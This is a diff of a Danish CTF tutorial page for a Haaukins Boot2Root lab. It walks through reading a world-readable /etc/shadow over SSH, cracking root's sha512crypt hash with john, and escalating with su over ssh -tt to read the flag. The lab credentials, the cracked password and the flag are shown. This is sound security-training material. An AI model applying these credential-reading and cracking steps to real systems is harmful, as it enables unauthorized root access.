@@ -22,18 +22,43 @@
 <div class="badges"><span class="badge cat">Boot2Root</span><span class="badge">Haaukins CTF</span></div>
 <div class="callout">🎓 <strong>Prøv selv først.</strong> Trinene viser metoden; det konkrete flag ligger i en sammenklappelig spoiler nederst. Haaukins-flag er ofte per-instans, så det er <em>fremgangsmåden</em> der tæller.</div>
 <div class="callout">📚 <strong>Baggrund:</strong> denne opgave bygger på en fælles teknik — læs primeren: <a href="kom-i-gang.html">Kom i gang: VPN, Hosts og lab-opsætning</a>.</div>
-<h2>Trin for trin</h2>
-<pre><code>ssh user1@shadow.hkn    # password: start
-ls -la /etc/shadow      # -rw-r--r-- -> WORLD-READABLE (misconfig!)
-john --format=sha512crypt --wordlist=rockyou.txt root.hash   # -> conga
-printf 'conga\n' | ssh -tt user1@shadow.hkn 'su root -c "cat /home/root/flag.txt"'</code></pre>
-             <p>Direkte root-SSH er slået fra (<code>PermitRootLogin no</code>), så brug <code>su</code> via en pty
-             (<code>ssh -tt</code>).</p>
+<h2>Sporet: hvorfor lige /etc/shadow?</h2>
+<ol class="steps">
+<li><strong>Læs hintet bogstaveligt.</strong> Opgaven giver dig SSH-adgang (<code>user1:start</code>)
+og siger: "not sure I have all permissions under control... hopefully they don't find what is
+hiding <em>in the shadows</em>." To spor i én sætning: problemet er FIL-RETTIGHEDER, og ordet
+"shadows" peger på <code>/etc/shadow</code>, filen der holder password-hashes.</li>
+<li><strong>Tjek rettigheden på den fil hintet udpeger.</strong>
+<pre><code>ssh user1@shadow.hkn        # password: start
+ls -la /etc/shadow
+# -rw-r--r-- 1 root shadow   <- world-readable!</code></pre>
+<code>/etc/shadow</code> skal være <code>-rw-r-----</code> (kun root og shadow-gruppen). Her kan
+ENHVER bruger læse den. Det er misconfig'en.</li>
+<li><strong>Læs root's hash og genkend typen.</strong>
+<pre><code>cat /etc/shadow      # root:$6$S.geY3nC$6Gcx...</code></pre>
+Præfikset <code>$6$</code> betyder sha512crypt. Det fortæller dig præcis hvilken john/hashcat-mode
+du skal bruge.</li>
+<li><strong>Knæk hashen offline</strong> (ingen grund til at røre serveren):
+<pre><code>echo 'root:$6$S.geY3nC$6Gcx...' > root.hash
+<span class="gloss" tabindex="0" data-tip="John the Ripper — password-cracker (CPU-baseret, mange hash-formater).">john</span> --format=sha512crypt --wordlist=rockyou.txt root.hash   # -> conga</code></pre></li>
+<li><strong>Bliv root med password'et.</strong> Direkte root-SSH er slået fra
+(<code>PermitRootLogin no</code>), og <code>su</code> kræver en rigtig terminal, så brug en
+pty via <code>ssh -tt</code>:
+<pre><code>printf 'conga\n' | ssh -tt user1@shadow.hkn 'su root -c "cat /home/root/flag.txt"'</code></pre></li>
+</ol>
+<p>(Flaget ligger i <code>/home/root/flag.txt</code>, ikke <code>/root</code>.)</p>
 <details class="spoiler"><summary>🚩 Vis løsning &amp; eksempel-flag</summary>
 <p>Flag: <span class="flag">DDC{Prot3ct_y0ur_s3cr3ts}</span></p>
 </details>
 <h2>Hvad du har lært</h2>
-<ul><li><code>/etc/shadow</code> skal være <code>-rw-r-----</code>; world-readable = enhver kan knække root.</li><li><code>su</code> kræver en pty → <code>ssh -tt</code>, password pipes ind.</li></ul>
+<ul><li><code>/etc/shadow</code> skal være <code>-rw-r-----</code>; world-readable = enhver kan knække root.</li><li><code>su</code> kræver en pty via <code>ssh -tt</code>, password pipes ind.</li></ul>
+<h2>Hvor ses dette igen?</h2>
+<p>Fil-rettigheder er et af de første steder at kigge efter privesc. Tjek altid om følsomme
+filer er læsbare for for mange: <code>/etc/shadow</code> (password-hashes),
+<code>/etc/sudoers</code>, private nøgler, backup-filer, config med credentials. Et enkelt forkert
+bit (<code>-rw-r--r--</code> i stedet for <code>-rw-r-----</code>) er nok. Når du har en hash,
+afslører dens form algoritmen: <code>$6$</code> = sha512crypt, <code>$1$</code> = md5crypt,
+<code>$2b$</code> = bcrypt, hvilket fortæller john/hashcat hvilken mode de skal bruge.</p>
 <footer>
 Del af <a href="index.html">Haaukins CTF-tutorials</a>. <a href="https://www.haaukins.dk/" target="_blank">Haaukins</a>
 er en dansk undervisningsplatform til sikkerhedstræning (AAU / De Danske Cybermesterskaber) — alle opgaver
